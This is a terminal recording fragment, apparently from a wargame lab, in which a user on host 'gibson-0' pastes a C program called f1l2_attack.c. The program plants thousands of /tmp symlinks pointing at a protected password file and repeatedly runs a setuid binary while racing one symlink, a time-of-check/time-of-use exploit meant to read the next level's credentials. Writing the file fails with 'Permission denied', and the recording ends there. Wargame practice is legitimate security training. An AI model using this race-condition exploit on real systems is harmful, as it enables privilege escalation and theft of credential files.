[22.183595, "o", "cat > /tmp/f1l2_attack.c <<'CEOF'\r\r\n\u001b[?2004l\r\u001b[?2004h> #include <stdio.h>\r\r\n\u001b[?2004l\r\u001b[?2004h> #include <stdlib.h>\r\r\n\u001b[?2004l\r\u001b[?2004h> #include <string.h>\r\r\n\u001b[?2004l\r\u001b[?2004h> #include <unistd.h>\r\r\n\u001b[?2004l\r\u001b[?2004h> #include <sys/wait.h>\r\r\n\u001b[?2004l\r\u001b[?2004h> #include <signal.h>\r\r\n\u001b[?2004l\r\u001b[?2004h> #define PWFILE \"/etc/formulaone_pass/formulaone2\"\r\r\n\u001b[?2004l\r\u001b[?2004h> #define HOLE \"tmp_mzzz\"\r\r\n\u001b[?2004l\r\u001b[?2004h> int main(void) {\r\r\n\u001b[?2004l\r\u001b[?2004h>     char name[32];\r\r\n\u001b[?2004l\r\u001b[?2004h>     long made = 0;\r\r\n\u001b[?2004l\r\u001b[?2004h>     for (int a = 0; a < 26; a++)\r\r\n\u001b[?2004l\r\u001b[?2004h>       for (int b = 0; b < 26; b++)\r\r\n\u001b[?2004l\r\u001b[?2004h>         for (int c = 0; c < 26; c++)\r\r\n\u001b[?2004l\r\u001b[?2004h>           for (int d = 0; d < 26; d++) {\r\r\n\u001b[?2004l\r\u001b[?2004h>             snprintf(name, sizeof(name), \"/tmp/tmp_%c%c%c%c\",\r\r\n\u001b[?2004l\r\u001b[?2004h>                      'a'+a, 'a'+b, 'a'+c, 'a'+d);\r\r\n\u001b[?2004l\r\u001b[?2004h>             if (strcmp(name+5, HOLE) == 0) continue;\r\r\n\u001b[?2004l\r\u001b[?2004h>             if (symlink(PWFILE, name) == 0) made++;\r\r\n\u001b[?2004l\r\u001b[?2004h>           }\r\r\n\u001b[?2004l\r\u001b[?2004h>     fprintf(stderr, \"made %ld symlinks\\n\", made);\r\r\n\u001b[?2004l\r\u001b[?2004h>     for (int round = 0; round < 200; round++) {\r\r\n\u001b[?2004l\r\u001b[?2004h>         pid_t p = fork();\r\r\n\u001b[?2004l\r\u001b[?2004h>         if (p == 0) {\r\r\n\u001b[?2004l\r\u001b[?2004h>             execl(\"/formulaone/formulaone2\", \"formulaone2\", (char*)0);\r\r\n\u001b[?2004l\r\u001b[?2004h>             _exit(127);\r\r\n\u001b[?2004l\r\u001b[?2004h>         }\r\r\n\u001b[?2004l\r\u001b[?2004h>         int alive = 1;\r\r\n\u001b[?2004l\r\u001b[?2004h>         for (int t = 0; t < 20000 && alive; t++) {\r\r\n\u001b[?2004l\r\u001b[?2004h>             if (waitpid(p, NULL, WNOHANG) != 0) alive = 0;\r\r\n\u001b[?2004l\r\u001b[?2004h>             symlink(PWFILE, \"/tmp/\" HOLE);\r\r\n\u001b[?2004l\r\u001b[?2004h>             unlink(\"/tmp/\" HOLE);\r\r\n\u001b[?2004l\r\u001b[?2004h>         }\r\r\n\u001b[?2004l\r\u001b[?2004h>         if (alive) kill(p, SIGKILL);\r\r\n\u001b[?2004l\r\u001b[?2004h>         waitpid(p, NULL, 0);\r\r\n\u001b[?2004l\r\u001b[?2004h>     }\r\r\n\u001b[?2004l\r\u001b[?2004h>     return 0;\r\r\n\u001b[?2004l\r\u001b[?2004h> }\r\r\n\u001b[?2004l\r\u001b[?2004h> CEOF\r\r\n\u001b[?2004l\r\u001b]3008;start=6b584e4f-4460-4f62-8210-e48196b44fc1;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=formulaone2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/formulaone2\u001b\\-bash: /tmp/f1l2_attack.c: Permission denied\r\r\n\u001b]3008;end=6b584e4f-4460-4f62-8210-e48196b44fc1;exit=failure;status=1\u001b\\\u001b]3008;start=8a9af750-0b24-4ff6-b58a-1462bd9feb9d;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=formulaone2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/formulaone2\u001b\\\u001b[?2004h\u001b]0;formulaone2@formulaone: ~\u0007formulaone2@formulaone:~$ "]
